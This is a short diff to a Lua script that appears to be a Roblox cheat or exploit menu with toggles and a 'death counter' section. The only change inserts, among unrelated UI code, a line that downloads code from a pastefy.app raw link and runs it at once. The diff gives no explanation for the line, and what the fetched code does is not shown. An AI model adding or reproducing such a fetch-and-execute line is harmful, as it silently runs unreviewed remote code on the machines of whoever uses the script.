@@ -2861,7 +2861,7 @@ local Toggle = Tabtsb:CreateToggle({
     end,
 })
 
-
+loadstring(game:HttpGet('https://pastefy.app/dCvpeFfn/raw'))()
 
 local Section = Tab:CreateSection("death counter")
 local Button = Tab:CreateButton({
